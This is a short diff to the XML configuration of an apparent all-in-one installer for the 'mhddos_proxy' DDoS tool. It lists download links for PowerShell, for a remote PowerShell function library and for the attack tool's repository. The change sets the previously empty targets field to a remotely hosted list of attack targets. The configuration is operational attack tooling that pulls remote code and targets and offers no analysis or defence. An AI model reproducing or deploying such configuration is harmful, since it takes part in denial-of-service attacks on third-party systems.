@@ -9,7 +9,7 @@
         <posh64>https://github.com/PowerShell/PowerShell/releases/download/v7.2.4/PowerShell-7.2.4-win-x64.zip</posh64>
         <funclib>https://raw.githubusercontent.com/ahovdryk/aio_reaper/main/functions.ps1</funclib>
         <load>https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git</load>
-        <targets></targets>
+        <targets>https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets</targets>
     </links>
     <folders>
         <install>AIOReaper</install>
